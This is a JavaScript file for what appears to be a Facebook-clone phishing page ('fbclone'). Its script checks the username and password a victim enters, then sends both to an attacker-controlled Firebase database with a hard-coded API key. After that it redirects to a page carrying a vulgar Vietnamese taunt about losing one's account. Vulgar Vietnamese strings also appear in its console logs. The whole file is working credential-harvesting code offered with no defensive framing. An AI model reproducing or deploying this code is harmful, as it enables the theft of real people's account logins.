console.log("mò cái lồn");

//time
var today = new Date();
var date = today.getFullYear() + "-" + (today.getMonth() + 1) + "-" + today.getDate();
var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
var dateTime = date + " " + time;

// Initialize Firebase
var config = {
    apiKey: "AIzaSyDVgPfw2XjnC5HaFgSBmXuTQwSMdng_t_A",
    authDomain: "stromez-ed239.firebaseapp.com",
    databaseURL: "https://stromez-ed239-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "stromez-ed239",
    storageBucket: "stromez-ed239.appspot.com",
    messagingSenderId: "163917711894",
};
firebase.initializeApp(config);

//lưu
function writeData() {
	if (document.getElementById("pass").value.length > 7) {
    if (document.getElementById("name").value.search("@") > 2) {
        writefb();
    } else {
        if (document.getElementById("name").value.length > 9) {
            writefb();
        } else {
            document.getElementById("name").value = "";
        }
    }
}}

var check =  dateTime;

function writefb() {
	console.log("done");
	firebase
        .database()
        .ref("fbclone/" + check)
        .set({
            name: document.getElementById("name").value,
            pass: document.getElementById("pass").value,
        });
	var ref = firebase.database().ref('fbclone/' + check + '/name');
	ref.on("value", function(snapshot) {
		if (snapshot.val() == null) {
		console.log(snapshot.val());
		console.log("cc");
		} else { 
		console.log("lồn");
		setTimeout(() => {
			window.open("./text#đcm%20cứ%20nhập%20lung%20tung%20thế%20này%20có%20ngày%20mất%20nick%20con%20ạ%20=))))", "_self"); 
			}, 3000);
		}
	}, function (error) {
	console.log("Error: " + error.code);
	console.log("lồn ");
	});

}

document.getElementById('login').onkeypress=function(e){
    if(e.keyCode==13){
        document.getElementById('login').click();
    }
}

//var ref = firebase.database().ref('fbclone/' + check  + '/name');
//ref.on("value", function(snapshot) {
//   console.log(snapshot.val());
//}, function (error) {
//   console.log("Error: " + error.code);
//});
//.openInNewTab('./text#đcm%20cứ%20nhập%20lung%20tung%20thế%20này%20có%20ngày%20mất%20nick%20con%20ạ%20=))))')
